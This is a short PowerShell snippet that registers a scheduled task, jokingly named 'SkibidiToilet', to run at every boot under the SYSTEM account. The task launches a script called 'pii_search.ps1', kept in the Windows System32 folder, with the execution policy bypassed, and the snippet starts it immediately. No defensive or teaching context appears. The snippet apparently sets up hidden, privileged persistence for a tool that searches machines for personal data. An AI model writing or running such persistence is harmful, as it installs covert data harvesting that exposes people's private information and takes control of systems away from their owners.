$taskName = "SkibidiToilet"
schtasks /Create /SC ONSTART /TN $taskName /TR "powershell.exe -ep bypass -file C:\Windows\System32\pii_search.ps1" /RU "SYSTEM" /F
schtasks /Run /TN "$taskName"